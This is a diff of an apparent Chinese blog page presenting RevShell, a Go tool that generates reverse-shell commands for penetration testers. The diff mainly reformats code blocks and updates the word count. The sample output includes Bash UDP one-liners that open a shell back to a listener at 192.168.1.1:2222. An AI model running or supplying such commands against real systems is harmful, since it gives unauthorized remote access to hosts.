@@ -10,7 +10,7 @@
 <meta name="description" content="RevShell是一个基于Go语言的反弹Shell命令生成工具，旨在帮助安全研究人员和渗透测试人员在需要与目标主机建立反向连接时快速生成相应的Shell代码。" /><meta name="keywords" content='tools' /><meta itemprop="name" content="020-RevShell：一款好用的生成反弹Shell命令的工具">
 <meta itemprop="description" content="RevShell是一个基于Go语言的反弹Shell命令生成工具，旨在帮助安全研究人员和渗透测试人员在需要与目标主机建立反向连接时快速生成相应的Shell代码。"><meta itemprop="datePublished" content="2023-08-14T14:08:08+08:00" />
 <meta itemprop="dateModified" content="2023-08-14T14:08:08+08:00" />
-<meta itemprop="wordCount" content="797">
+<meta itemprop="wordCount" content="829">
 <meta itemprop="keywords" content="tools," /><meta property="og:title" content="020-RevShell：一款好用的生成反弹Shell命令的工具" />
 <meta property="og:description" content="RevShell是一个基于Go语言的反弹Shell命令生成工具，旨在帮助安全研究人员和渗透测试人员在需要与目标主机建立反向连接时快速生成相应的Shell代码。" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/revshell\/"
-    },"genre": "posts","keywords": "tools","wordcount":  797 ,
+    },"genre": "posts","keywords": "tools","wordcount":  829 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/revshell\/","datePublished": "2023-08-14T14:08:08+08:00","dateModified": "2023-08-14T14:08:08+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -190,7 +190,7 @@
       <div class="post-meta-line"><span class="post-author"><a href="https://blog.csdn.net/weixin_42575797?type=blog" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
     Gh0stX</a></span>
           <span class="post-category">收录于 <a href="/categories/tools/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Tools</a></span></div>
-      <div class="post-meta-line"><span title=2023-08-14&#32;14:08:08><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-14">2023-08-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 797 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 2 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2023-08-14&#32;14:08:08><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-14">2023-08-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 829 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 2 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -223,18 +223,72 @@ bash、sh、nc、ruby、php、python、rcat、perl、socat、node、telnet、zsh
 <ul>
 <li>自行编译运行</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ go build revshell.go
-</span></span></code></pre></div><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ go build revshell.go
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>直接下载项目Releases中编译好的工具</li>
 </ul>
 <p><a href="https://github.com/BetterDefender/revshell/releases"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/BetterDefender/revshell/releases</a></p>
 <p><img loading="lazy" src="/resource/RevShell.assets/image-20230814142045336.png" srcset="/resource/RevShell.assets/image-20230814142045336.png, /resource/RevShell.assets/image-20230814142045336.png 1.5x, /resource/RevShell.assets/image-20230814142045336.png 2x" sizes="auto" data-title="image-20230814142045336" data-alt="image-20230814142045336" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="使用方法">使用方法</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./revshell <span class="o">[</span>IPADDR<span class="o">]</span> <span class="o">[</span>PORT<span class="o">]</span> <span class="o">[</span>LANGUAGE<span class="o">]</span>
-</span></span></code></pre></div><h2 id="使用示例">使用示例</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./revshell 192.168.1.1 <span class="m">2222</span> bash
-</span></span></code></pre></div><h3 id="macos">MacOS</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./revshell 192.168.1.1 <span class="m">2222</span> bash
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./revshell <span class="o">[</span>IPADDR<span class="o">]</span> <span class="o">[</span>PORT<span class="o">]</span> <span class="o">[</span>LANGUAGE<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="使用示例">使用示例</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./revshell 192.168.1.1 <span class="m">2222</span> bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="macos">MacOS</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./revshell 192.168.1.1 <span class="m">2222</span> bash
 </span></span><span class="line"><span class="cl"> _____               _____ _          _ _    _____  
 </span></span><span class="line"><span class="cl"><span class="p">|</span>  __ <span class="se">\ </span>            / ____<span class="p">|</span> <span class="p">|</span>        <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  / ____<span class="p">|</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>_____   __ <span class="p">|</span> <span class="o">(</span>___ <span class="p">|</span> <span class="p">|</span>__   ___<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __  ___ _ __ 
@@ -263,7 +317,9 @@ bash、sh、nc、ruby、php、python、rcat、perl、socat、node、telnet、zsh
 </span></span><span class="line"><span class="cl">Bash UDP:
 </span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/udp/192.168.1.1/2222 0&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></span><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/udp/192.168.1.1/2222 0&gt;<span class="p">&amp;</span><span class="m">1</span>
-</span></span></code></pre></div><p><img loading="lazy" src="/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png" srcset="/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png, /resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png 1.5x, /resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png" srcset="/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png, /resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png 1.5x, /resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h3 id="windows">Windows</h3>
 <p><img loading="lazy" src="/resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png" srcset="/resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png, /resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png 1.5x, /resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h3 id="linux">Linux</h3>
